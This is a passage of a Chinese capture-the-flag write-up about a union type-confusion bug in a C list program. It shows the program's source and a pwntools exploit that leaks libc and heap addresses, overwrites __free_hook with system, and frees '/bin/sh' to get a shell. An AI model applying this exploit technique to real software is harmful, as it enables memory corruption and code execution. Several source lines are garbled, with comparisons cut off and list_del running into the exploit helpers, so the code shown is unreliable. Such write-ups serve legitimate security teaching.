    typedef union {
      char *p_char;
      long d_long;
      double d_double;
    } Data;
    void add(List *list)
    {
      char buf[128];
      printf("Type(long=%d/double=%d/str=%d): ", LIST_LONG, LIST_DOUBLE, LIST_STRING);
      switch(read_long()) {
      case LIST_LONG:
        printf("Data: ");
        list_add(list, (Data)read_long(), LIST_LONG);
        break;
      case LIST_DOUBLE:
        printf("Data: ");
        list_add(list, (Data)read_double(), LIST_DOUBLE);
        break;
      case LIST_STRING:
        printf("Data: ");
        read_str(buf);
        list_add(list, (Data)buf, LIST_STRING);
        break;
      default:
        puts("Invalid option");
        return;
      }
    }
    /*
     * Add an element
     */
    void list_add(List* list, Data data, LIST_TYPE type)
    {
      Data *p;
      if (list->size >= list->max) {
        /* Re-allocate a chunk if the list is full */
        Data *old = list->data;
        list->max += CHUNK_SIZE;
        list->data = (Data*)malloc(sizeof(Data) * list->max);
        if (list->data == NULL)
          __list_abort("Allocation error");
        if (old != NULL) {
          /* Copy and free the old chunk */
          memcpy((char*)list->data, (char*)old, sizeof(Data) * (list->max - 1));
          free(old);
        }
      }
      /* Store new data */
      switch(type) {
      case LIST_LONG:
        list->data[list->size].d_long = data.d_long;
        break;
      case LIST_DOUBLE:
        list->data[list->size].d_double = data.d_double;
        break;
      case LIST_STRING:
        list->data[list->size].p_char = strdup(data.p_char);
        /* Insert the address to free pool
           so that it'll be freed when the list is deleted */
        if (fpool_num data[list->size].p_char;
          fpool_num++;
        }
        break;
      default:
        __list_abort("Invalid type");
      }
      list->size++;
    }
`get`函数输出指定`idx`的内容，这里注意如何输出取决于我们选择的类型，因为`union`成员的内存共享，因此对于同样一个`data`，我们选择`long`类型，就可以用`%ld`输出，如果我们选择`str`类型，就可以用`%s`输出，是一个`类型混淆`错误。
    void get(List *list)
    {
      printf("Index: ");
      long index = read_long();
      printf("Type(long=%d/double=%d/str=%d): ", LIST_LONG, LIST_DOUBLE, LIST_STRING);
      switch(read_long()) {
      case LIST_LONG:
        printf("Data: %ld\n", list_get(list, index).d_long);
        break;
      case LIST_DOUBLE:
        printf("Data: %lf\n", list_get(list, index).d_double);
        break;
      case LIST_STRING:
        printf("Data: %s\n", list_get(list, index).p_char);
        break;
      default:
        puts("Invalid option");
        return;
      }
    }
    /*
     * Get an element
     */
    Data list_get(List* list, int index)
    {
      if (index size data[index].p_char;
    }
`edit`可以编辑`list->data[index]`。这里可以结合之前`类型混淆`的漏洞利用，比如我们想知道`addr`处的值，则可以先使用`edit`的`long`类型编辑`data为addr`，而后用`get`的`str`部分处理，从而泄露内存内容。
    void edit(List *list)
    {
      char buf[128];
      printf("Index: ");
      long index = read_long();
      printf("Type(long=%d/double=%d/str=%d): ", LIST_LONG, LIST_DOUBLE, LIST_STRING);
      switch(read_long()) {
      case LIST_LONG: /* long */
        printf("Data: ");
        list_edit(list, index, (Data)read_long(), LIST_LONG);
        break;
      case LIST_DOUBLE: /* double */
        printf("Data: ");
        list_edit(list, index, (Data)read_double(), LIST_DOUBLE);
        break;
      case LIST_STRING: /* str */
        printf("Data: ");
        read_str(buf);
        list_edit(list, index, (Data)buf, LIST_STRING);
        break;
      default:
        puts("Invalid option");
        return;
      }
    }
    /*
     * Edit an element
     */
    void list_edit(List* list, int index, Data data, LIST_TYPE type)
    {
      if (index size data[index].d_long = data.d_long;
        break;
      case LIST_DOUBLE:
        list->data[index].d_double = data.d_double;
        break;
      case LIST_STRING:
        list->data[index].p_char = strdup(data.p_char);
        /* Insert the address to free pool */
        if (fpool_num data[list->size].p_char;
          fpool_num++;
        }
        break;
      default:
        __list_abort("Invalid type");
      }
    }
`del`删除指定索引的`data`及`fpool`存储的堆块，删除方式是从要删除的data后面依次向前覆盖data数据。
之后根据`fpool[i] ==
data.p_char`去寻找fpool对应的堆块，注意这里`p_char`也可以是`long`类型得到的一个地址，因此结合上`edit`我们可以控制任意地址的释放，并且free之后并未清空fpool数据。
    void del(List *list)
    {
      printf("Index: ");
      long index = read_long();
      list_del(list, index);
      puts("Successfully removed");
    }
    /*
     * Delete an element
     */
    void list_del(List* list, int index)
    {
      int i;
      if (index size data[index];
      /* Shift data list and remove the last one */
      for(i = index; i size - 1; i++) {
        list->data[i] = list->data[i + 1];
      }
      list->data[i].d_long = 0;
      list->size--;
      /* Free data if it's in the pool list */
      for(i = 0; i  ')
        p.sendline('1')
        p.recvuntil("Type(long=1/double=2/str=3): ")
        p.sendline(maps[tp])
        p.recvuntil("Data: ")
        p.send(data)
    def Show(index,tp):
        p.recvuntil('> ')
        p.sendline('2')
        p.recvuntil("Index: ")
        p.sendline(str(index))
        p.recvuntil("Type(long=1/double=2/str=3): ")
        p.sendline(maps[tp])
    def Edit(index,tp,data):
        p.recvuntil('> ')
        p.sendline('3')
        p.recvuntil("Index: ")
        p.sendline(str(index))
        p.recvuntil("Type(long=1/double=2/str=3): ")
        p.sendline(maps[tp])
        p.recvuntil("Data: ")
        p.send(data)
    def Delete(index):
        p.recvuntil('> ')
        p.sendline('4')
        p.recvuntil("Index: ")
        p.sendline(str(index))
    def exp():
        #leak libc
        Add("str","/bin/sh")#0
        Add("str","/bin/sh")#1
        puts_got = elf.got["puts"]
        Edit(0,"long",str(puts_got))
        Show(0,"str")
        p.recvuntil("Data: ")
        libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - libc.sym['puts']
        log.success("libc base => " + hex(libc_base))
        #leak heap
        bss_lis = 0x602100
        Edit(0,"long",str(bss_lis))
        Show(0,"str")
        p.recvuntil("Data: ")
        heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x2b0
        log.success("heap base => " + hex(heap_base))
        #recover
        Edit(0,"long",str(heap_base+0x2b0))
        Edit(1,"long",str(heap_base+0x2b0))
        Delete(1)
        Delete(0)
        #gdb.attach(p,'b malloc')
        Add("str",p64(libc_base+libc.sym['__free_hook']))
        Add("str","/bin/sh\x00")
        Add("str",p64(libc_base+libc.sym['system']))
        Delete(0)
        p.interactive()
    exp()
## 总结
这两道题利用的漏洞原理都是`union`的变量内存共享，因为变量名的缘故做题的时候可能会自动代入到对应的类型而忽略了这个变量在作为其他类型处理时候可能会被赋值或读取，不过因为`union`用的比较少，一旦我们接触到这类漏洞之后，一旦题目中出现就容易引起警觉。此外在`IDA`的反汇编中其实并不会识别出`union`，对它来讲这只是一个变量而已，因此直接看`IDA`或许会更容易发现漏洞。